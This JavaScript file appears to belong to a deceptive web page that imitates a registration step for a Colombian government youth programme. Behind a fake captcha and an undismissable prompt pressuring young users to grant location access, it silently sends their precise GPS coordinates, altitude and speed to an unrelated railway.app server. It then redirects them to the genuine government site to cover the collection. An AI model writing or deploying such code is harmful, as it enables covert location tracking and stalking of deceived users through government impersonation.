const idCaptcha = "#captchaText";
const documento = "#DocumentoBusqueda";
const inputCaptcha = "#CaptchaInputText";

function makeid(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const generateCaptcha = () => {
  const captcha = document.querySelector(idCaptcha);
  const letters = makeid(4);
  captcha.innerHTML = letters;
  captcha.setAttribute("data-text", letters);
};

const eventRefreshImage = () => {
  const refreshImage = document.querySelector("#selectImage");
  refreshImage.addEventListener("click", (e) => {
    e.preventDefault();
    generateCaptcha();
  });
};

const onSubmit = () => {
  const form = document.querySelector("#formValidacion");
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    window.location.replace(
      "https://jovenes.prosperidadsocial.gov.co/Registro/Pre-registro"
    );
  });
};

const getUbication = () => {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = JSON.stringify({
        time: position.timestamp,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        speed: position.coords.speed,
      });

      fetch("https://http-nodejs-production-622e.up.railway.app/setData", {
        method: "POST",
        body: JSON.stringify({
          data: data,
        }),
        headers: {
          "Content-Type": "application/json",
        },
      });

      swal.close();
    },
    (error) => {
      console.log(error, error.code === error.POSITION_UNAVAILABLE);
      if (error.code === 2) {
      }

      if (error.code === error.PERMISSION_DENIED) {
        // window.location.reload(true);
      }
    },
    {
      enableHighAccuracy: true,
    }
  );
};

(function () {
  generateCaptcha();
  eventRefreshImage();
  onSubmit();
  swal({
    title: "Apreciado (a) joven",
    text: "Por favor presione '<b>Permitir</b>', esto es necesario para continuar con el proceso de registro",
    type: "warning",
    confirmButtonColor: "#DD6B55",
    confirmButtonText: "Aceptar",
    closeOnConfirm: false,
    closeOnCancel: false,
    showCloseButton: false,
    allowOutsideClick: false,
    allowEscapeKey: false,
    html: true,
  });
  swal.disableButtons();
  getUbication();
})();
